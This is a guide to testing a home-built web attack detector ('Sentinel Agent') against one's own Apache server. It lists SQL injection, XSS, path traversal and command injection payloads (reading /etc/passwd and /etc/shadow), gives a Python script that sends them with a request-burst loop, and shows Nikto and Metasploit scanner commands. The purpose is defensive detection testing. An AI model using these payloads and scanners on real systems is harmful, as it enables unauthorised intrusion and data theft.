# Web Attack Testing Guide for Sentinel Agent

## Overview
This guide demonstrates how to test your Sentinel Agent's web attack detection capabilities by simulating real attacks against your Apache server at `http://192.168.31.91`.

## ✅ Will Your Agent Detect These Attacks?

**YES!** Your Sentinel Agent will detect client-side web attacks because:

1. **Web Log Monitoring**: Your agent monitors `/var/log/apache2/access.log` via `WebSensor`
2. **Attack Detection**: The `AttackDetector` identifies patterns like:
   - SQL Injection attempts
   - XSS (Cross-Site Scripting) 
   - Path Traversal / Directory Traversal
   - Command Injection
   - Suspicious user agents
   - Abnormal request patterns
3. **AI Analysis**: Each detected attack triggers the multi-agent AI crew for threat assessment
4. **Anomaly Scoring**: ML-based scoring evaluates attack severity

---

## 🎯 Attack Testing Methods

### Method 1: Manual Browser-Based Testing

#### A. SQL Injection Testing
Open your browser and try these URLs:

```
http://192.168.31.91/index.php?id=1' OR '1'='1
http://192.168.31.91/search.php?q=' UNION SELECT NULL--
http://192.168.31.91/login.php?user=admin'--
http://192.168.31.91/page.php?id=1 AND 1=1
http://192.168.31.91/data.php?name='; DROP TABLE users--
```

#### B. XSS (Cross-Site Scripting) Testing
```
http://192.168.31.91/search?q=<script>alert('XSS')</script>
http://192.168.31.91/comment?text=<img src=x onerror=alert(1)>
http://192.168.31.91/page?name=<svg/onload=alert('XSS')>
```

#### C. Path Traversal Testing
```
http://192.168.31.91/../../etc/passwd
http://192.168.31.91/page?file=../../../../etc/shadow
http://192.168.31.91/download?path=..%2F..%2F..%2Fetc%2Fpasswd
```

#### D. Command Injection Testing
```
http://192.168.31.91/ping?host=127.0.0.1; cat /etc/passwd
http://192.168.31.91/exec?cmd=ls -la | whoami
http://192.168.31.91/system?run=`cat /etc/shadow`
```

---

### Method 2: Using cURL (Command Line)

#### Basic Attack Simulation
```bash
# SQL Injection
curl "http://192.168.31.91/index.php?id=1' OR '1'='1"

# XSS Attempt
curl "http://192.168.31.91/search?q=<script>alert('XSS')</script>"

# Path Traversal
curl "http://192.168.31.91/../../etc/passwd"

# Suspicious User-Agent
curl -A "sqlmap/1.0" http://192.168.31.91/

# Multiple rapid requests (DoS simulation)
for i in {1..50}; do curl http://192.168.31.91/ & done
```

---

### Method 3: Using Nikto (Automated Web Scanner)

```bash
# Install Nikto
sudo apt-get install nikto

# Run basic scan
nikto -h http://192.168.31.91

# Verbose scan with all plugins
nikto -h http://192.168.31.91 -Plugins ALL -Display V

# Targeted vulnerability scan
nikto -h http://192.168.31.91 -Tuning 123456789
```

**Tuning Options:**
- 1: Interesting files
- 2: Misconfiguration
- 3: Information disclosure
- 4: XSS
- 5: SQL Injection
- 6: Command execution
- 7: File upload
- 8: DoS
- 9: Authentication bypass

---

### Method 4: Using OWASP ZAP (GUI Tool)

1. **Install OWASP ZAP**:
   ```bash
   # Download from https://www.zaproxy.org/download/
   ```

2. **Run Automated Scan**:
   - Open ZAP
   - Enter target: `http://192.168.31.91`
   - Click "Automated Scan"
   - Select attack mode: Active or Passive

3. **Manual Testing**:
   - Use ZAP as a proxy
   - Browse the site
   - Use "Active Scan" on specific pages

---

### Method 5: Python Script (Custom Attack Simulation)

Create `test_web_attacks.py`:

```python
#!/usr/bin/env python3
"""
Web Attack Testing Script for Sentinel Agent
Tests various attack vectors against Apache server
"""

import requests
import time
from urllib.parse import urljoin

TARGET = "http://192.168.31.91"

# Attack payloads
SQL_INJECTION = [
    "' OR '1'='1",
    "' UNION SELECT NULL--",
    "admin'--",
    "1' AND 1=1--",
    "'; DROP TABLE users--"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert('XSS')>",
    "javascript:alert('XSS')"
]

PATH_TRAVERSAL = [
    "../../etc/passwd",
    "../../../../etc/shadow",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "../../../../../../../etc/hosts"
]

COMMAND_INJECTION = [
    "; cat /etc/passwd",
    "| whoami",
    "`ls -la`",
    "$(cat /etc/shadow)"
]

SUSPICIOUS_AGENTS = [
    "sqlmap/1.0",
    "Nikto",
    "w3af",
    "nmap",
    "Havij"
]

def test_sql_injection():
    """Test SQL injection detection"""
    print("[*] Testing SQL Injection...")
    for payload in SQL_INJECTION:
        url = f"{TARGET}/index.php?id={payload}"
        try:
            r = requests.get(url, timeout=5)
            print(f"  [+] Sent: {payload[:30]}... (Status: {r.status_code})")
        except Exception as e:
            print(f"  [-] Error: {e}")
        time.sleep(2)

def test_xss():
    """Test XSS detection"""
    print("\n[*] Testing XSS...")
    for payload in XSS_PAYLOADS:
        url = f"{TARGET}/search?q={payload}"
        try:
            r = requests.get(url, timeout=5)
            print(f"  [+] Sent XSS payload (Status: {r.status_code})")
        except Exception as e:
            print(f"  [-] Error: {e}")
        time.sleep(2)

def test_path_traversal():
    """Test path traversal detection"""
    print("\n[*] Testing Path Traversal...")
    for payload in PATH_TRAVERSAL:
        url = f"{TARGET}/{payload}"
        try:
            r = requests.get(url, timeout=5)
            print(f"  [+] Tried: {payload} (Status: {r.status_code})")
        except Exception as e:
            print(f"  [-] Error: {e}")
        time.sleep(2)

def test_command_injection():
    """Test command injection detection"""
    print("\n[*] Testing Command Injection...")
    for payload in COMMAND_INJECTION:
        url = f"{TARGET}/ping?host=127.0.0.1{payload}"
        try:
            r = requests.get(url, timeout=5)
            print(f"  [+] Sent command injection (Status: {r.status_code})")
        except Exception as e:
            print(f"  [-] Error: {e}")
        time.sleep(2)

def test_suspicious_agents():
    """Test suspicious user-agent detection"""
    print("\n[*] Testing Suspicious User-Agents...")
    for agent in SUSPICIOUS_AGENTS:
        headers = {"User-Agent": agent}
        try:
            r = requests.get(TARGET, headers=headers, timeout=5)
            print(f"  [+] Used agent: {agent} (Status: {r.status_code})")
        except Exception as e:
            print(f"  [-] Error: {e}")
        time.sleep(2)

def test_dos_simulation():
    """Simulate DoS attack with rapid requests"""
    print("\n[*] Testing DoS Pattern (Rapid Requests)...")
    for i in range(20):
        try:
            r = requests.get(TARGET, timeout=5)
            print(f"  [+] Request {i+1}/20 (Status: {r.status_code})")
        except Exception as e:
            print(f"  [-] Error: {e}")
        time.sleep(0.1)  # Very fast requests

def main():
    print("="*60)
    print("Sentinel Agent - Web Attack Testing Script")
    print(f"Target: {TARGET}")
    print("="*60)
    
    tests = [
        ("SQL Injection", test_sql_injection),
        ("XSS", test_xss),
        ("Path Traversal", test_path_traversal),
        ("Command Injection", test_command_injection),
        ("Suspicious User-Agents", test_suspicious_agents),
        ("DoS Simulation", test_dos_simulation)
    ]
    
    for name, test_func in tests:
        print(f"\n{'='*60}")
        test_func()
        print(f"\nWaiting 5 seconds before next test...")
        time.sleep(5)
    
    print("\n" + "="*60)
    print("[✓] All attack tests completed!")
    print("Check your Sentinel Agent dashboard for detections.")
    print("="*60)

if __name__ == "__main__":
    main()
```

**Run the script:**
```bash
python3 test_web_attacks.py
```

---

### Method 6: Using Metasploit (Advanced)

```bash
# Start Metasploit
msfconsole

# Use auxiliary scanner
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.31.91
run

# SQL injection scanner
use auxiliary/scanner/http/sql_injection
set RHOSTS 192.168.31.91
run

# Apache scanner
use auxiliary/scanner/http/apache_userdir_enum
set RHOSTS 192.168.31.91
run
```

---

## 📊 Monitoring Your Sentinel Agent

### 1. Watch Real-Time Detection (Terminal 1)
```bash
# SSH into your Ubuntu server
ssh ubuntu@192.168.31.91

# Monitor Sentinel logs
tail -f /app/logs/sentinel.log
# OR if running locally
tail -f ~/Project/logs/sentinel.log
```

### 2. Watch Apache Access Logs (Terminal 2)
```bash
ssh ubuntu@192.168.31.91
sudo tail -f /var/log/apache2/access.log
```

### 3. Check Attack Database (Terminal 3)
```bash
# View detected attacks via API
curl http://192.168.31.91:8000/api/attacks | python3 -m json.tool

# Or use the dashboard
python3 view_attacks.py
```

### 4. Web Dashboard
Access the Streamlit dashboard:
```bash
# On Ubuntu server
python3 -m streamlit run dashboard/app.py

# Then open in browser
http://192.168.31.91:8501
```

---

## 🔍 What to Expect

### Attack Detection Flow:
1. **You send attack** → Apache logs the request to `access.log`
2. **WebSensor detects** → Picks up suspicious patterns in log
3. **AttackDetector analyzes** → Identifies attack type (SQLi, XSS, etc.)
4. **AI Crew investigates** → Multi-agent analysis begins
5. **Anomaly Score calculated** → ML-based risk assessment
6. **Response proposed** → Firewall rule or monitoring action

### Expected Sentinel Output:
```
════════════════════════════════════════════════════════════
🚨 SECURITY ALERT - INCIDENT DETECTED
════════════════════════════════════════════════════════════
  Source IP Address    : 192.168.1.XXX (your client IP)
  Attack Vector        : web
  Attack Type          : sql_injection
  Severity Level       : high
  Timestamp            : 2026-02-22 10:30:45
────────────────────────────────────────────────────────────
  RAW LOG ENTRY:
  192.168.1.XXX - - [22/Feb/2026:10:30:45] "GET /index.php?id=1' OR '1'='1 HTTP/1.1" 404

🤖 AI CREW ANALYZING THREAT...
  ├─ Triage Analyst: Evaluating incident severity
  ├─ Threat Intel: Checking IP reputation
  ├─ Incident Responder: Determining response strategy
  └─ Enforcer: Preparing defensive actions

ANOMALY SCORE: 8.7/10 (HIGH RISK)
RECOMMENDATION: Block IP address
```

---

## 🛡️ Expected Detection Capabilities

| Attack Type | Detection Rate | Response |
|-------------|---------------|----------|
| SQL Injection | ✅ High | Firewall block proposal |
| XSS | ✅ High | Monitoring + alert |
| Path Traversal | ✅ High | Firewall block proposal |
| Command Injection | ✅ High | Immediate block proposal |
| DoS/Rate Limiting | ✅ Medium | Track + anomaly score |
| Suspicious User-Agents | ✅ High | Alert + monitoring |

---

## 📝 Testing Checklist

- [ ] Ensure Sentinel Agent is running (`docker ps` shows `sentinel-agent`)
- [ ] Verify web sensor is active (check logs for "Web log monitoring: ACTIVE")
- [ ] Confirm Apache is accessible (`curl http://192.168.31.91`)
- [ ] Set up log monitoring in separate terminal
- [ ] Run attack tests one at a time
- [ ] Observe Sentinel detection and AI analysis
- [ ] Check attack database via API
- [ ] Review proposed firewall rules
- [ ] Test human-in-the-loop approval flow

---

## 🎓 Understanding Client-Side vs Server-Side

### Your Question: "Will my agent detect client-side attacks?"

**YES - Here's why:**

1. **"Client-Side Attack" means**: You (the attacker) are using a client (browser, curl, script) to attack the server
   
2. **What gets logged**:
   - Every HTTP request from your client → Apache access.log
   - Your IP address, URL parameters, headers → All logged
   - Attack payloads (SQLi, XSS, etc.) → Visible in logs

3. **How Sentinel detects it**:
   - WebSensor monitors `access.log` in real-time
   - Sees malicious patterns like `' OR '1'='1` in URLs
   - Triggers AI analysis even if attack fails
   - Detection happens **regardless of attack success**

4. **Key Point**: Your agent monitors **HTTP requests**, not just successful exploits. Even failed attacks are detected!

---

## 🚀 Quick Start Attack Test

**Simplest test** (run from your Windows machine):

```bash
# Open PowerShell or Command Prompt
curl "http://192.168.31.91/?test=<script>alert('XSS')</script>"
curl "http://192.168.31.91/?id=1' OR '1'='1"
curl "http://192.168.31.91/../../etc/passwd"
```

Then check your Sentinel logs immediately!

---

## 📞 Troubleshooting

### If attacks aren't detected:

1. **Check Apache logs are being written**:
   ```bash
   sudo tail /var/log/apache2/access.log
   ```

2. **Verify Sentinel is monitoring web logs**:
   ```bash
   docker logs sentinel-agent | grep "Web log monitoring"
   ```

3. **Ensure log path is correct**:
   In your docker-compose.yml, verify:
   ```yaml
   environment:
     - WEB_LOG_PATH=/var/log/apache2/access.log
   ```

4. **Check file permissions**:
   ```bash
   sudo chmod 644 /var/log/apache2/access.log
   ```

---

## ⚠️ Important Notes

1. **Only test your own systems** - Never attack systems you don't own
2. **Legal compliance** - Ensure you have authorization
3. **False positives** - Some attacks may not trigger if patterns don't match
4. **Log rotation** - Apache rotates logs; ensure Sentinel handles this
5. **Performance** - Rapid attacks may cause high CPU usage

---

## 📚 Additional Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Apache Log Format](https://httpd.apache.org/docs/2.4/logs.html)
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [XSS Filter Evasion](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)

---

## 🎯 Success Criteria

Your test is successful if:
- ✅ Sentinel detects the attack within 2-5 seconds
- ✅ AI crew analysis is triggered
- ✅ Anomaly score is calculated
- ✅ Attack is logged in database
- ✅ Firewall rule is proposed (for severe attacks)
- ✅ You can view the attack in the dashboard

---

**Happy Testing! 🛡️**
